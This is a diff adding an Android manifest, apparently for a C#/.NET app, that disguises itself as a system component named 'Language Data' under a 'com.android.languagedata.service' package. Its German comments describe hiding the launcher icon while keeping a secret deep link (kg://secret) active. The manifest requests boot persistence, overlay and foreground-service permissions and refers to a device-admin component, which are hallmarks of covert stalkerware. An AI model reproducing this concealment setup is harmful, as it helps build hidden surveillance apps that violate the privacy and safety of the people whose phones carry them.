@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+	<uses-permission android:name="android.permission.INTERNET" />
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+	<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+	<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+	<uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+	<application
+		android:allowBackup="true"
+		android:icon="@mipmap/appicon"
+		android:roundIcon="@mipmap/appicon_round"
+		android:supportsRtl="true">
+
+		<!--
+			Service, BroadcastReceiver, DeviceAdmin werden von C#-Attributen generiert.
+			NICHT manuell deklarieren!
+		-->
+
+		<!--
+			Activity-Alias NUR fuer das Launcher-Icon.
+			Wird ein-/ausgeblendet um das App-Icon zu verstecken.
+			Die echte MainActivity bleibt IMMER aktiv (fuer Deep Link kg://secret).
+			CRC-Hash ermittelt aus acw-map.txt: crc64812a1a0f2141ca60
+		-->
+		<activity-alias
+			android:name="com.android.languagedata.service.MainLauncher"
+			android:targetActivity="crc64812a1a0f2141ca60.MainActivity"
+			android:label="Language Data"
+			android:icon="@mipmap/appicon"
+			android:roundIcon="@mipmap/appicon_round"
+			android:exported="true"
+			android:enabled="true">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>
+		</activity-alias>
+
+	</application>
+</manifest>
